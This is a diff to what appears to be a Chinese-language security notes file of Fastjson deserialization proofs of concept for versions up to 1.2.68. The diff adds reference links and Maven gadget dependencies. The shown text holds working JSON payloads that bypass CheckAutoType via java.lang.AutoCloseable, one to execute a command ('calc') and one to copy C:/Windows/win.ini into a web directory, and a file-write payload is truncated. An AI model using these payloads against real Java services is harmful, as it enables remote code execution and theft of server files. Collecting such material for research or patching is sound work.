@@ -624,6 +624,11 @@ poc:
 
 ### fastjson<=1.2.68 
 
+https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E
+
+https://b1ue.cn/archives/364.html
+
+
 - Fastjson <= 1.2.68；
 - 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；
 
@@ -638,7 +643,7 @@ poc:
 
 
 
-无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：
+无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：demo
 
 ```json
 {"@type":"java.lang.AutoCloseable","@type":"vul.VulAutoCloseable","cmd":"calc"}
@@ -647,6 +652,13 @@ poc:
 
 
 读文件
+```xml
+<dependency>
+   <groupId>org.aspectj</groupId>
+   <artifactId>aspectjtools</artifactId>
+   <version>1.9.5</version>
+</dependency>
+```
 
 ```json
 {"@type":"java.lang.AutoCloseable", "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream", "tempPath":"C:/Windows/win.ini", "targetPath":"D:/wamp64/www/win.txt"}
@@ -655,6 +667,19 @@ poc:
 
 
 写文件
+```xml
+<dependency>
+   <groupId>com.esotericsoftware</groupId>
+   <artifactId>kryo</artifactId>
+   <version>4.0.0</version>
+</dependency>
+
+<dependency>
+    <groupId>com.sleepycat</groupId>
+    <artifactId>je</artifactId>
+    <version>5.0.73</version>
+</dependency>
+```
 
 ```json
 {
